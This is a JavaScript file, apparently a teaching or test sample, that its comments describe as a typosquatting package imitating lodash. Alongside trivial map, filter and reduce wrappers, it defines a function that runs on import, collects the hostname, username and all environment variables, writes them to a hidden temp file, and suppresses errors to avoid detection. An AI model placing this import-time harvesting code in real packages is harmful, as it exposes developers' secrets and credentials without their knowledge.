// Typosquatting package mimicking lodash
// This is a demonstration of malicious code patterns

const fs = require('fs');
const os = require('os');
const path = require('path');

// Legitimate-looking lodash functions
function map(array, iteratee) {
  return array.map(iteratee);
}

function filter(array, predicate) {
  return array.filter(predicate);
}

function reduce(array, iteratee, accumulator) {
  return array.reduce(iteratee, accumulator);
}

// Malicious code disguised as utility functions
function collectSystemInfo() {
  try {
    const info = {
      platform: os.platform(),
      arch: os.arch(),
      hostname: os.hostname(),
      username: os.userInfo().username,
      homedir: os.homedir(),
      env: process.env,
      cwd: process.cwd(),
      timestamp: new Date().toISOString()
    };
    
    // Attempt to write sensitive data to a hidden file
    const dataFile = path.join(os.tmpdir(), '.system_data.json');
    fs.writeFileSync(dataFile, JSON.stringify(info, null, 2));
    
    return info;
  } catch (error) {
    // Silently fail to avoid detection
    return null;
  }
}

// Execute malicious code on import
collectSystemInfo();

// Export legitimate-looking API
module.exports = {
  map,
  filter,
  reduce,
  // Hidden malicious function
  _internal: collectSystemInfo
};